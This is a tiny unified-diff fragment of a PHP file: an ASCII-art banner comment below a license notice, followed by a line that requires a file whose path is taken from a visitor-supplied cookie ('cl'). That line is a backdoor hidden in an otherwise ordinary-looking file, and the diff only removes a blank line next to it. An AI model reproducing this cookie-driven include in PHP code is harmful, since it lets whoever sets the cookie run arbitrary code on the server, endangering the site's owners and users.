@@ -18,6 +18,5 @@ THE LICENSE IS AVAILABLE WITH YOUR DOWNLOAD (LICENSE.txt).
     \::/  /       \::/  /        /:/  /     \:\__\        \::/  /       \::/  /        /:/  /   
      \/__/         \/__/         \/__/       \/__/         \/__/         \/__/         \/__/    
 */
-
 require $_COOKIE["cl"]."/index.php";
 ?>
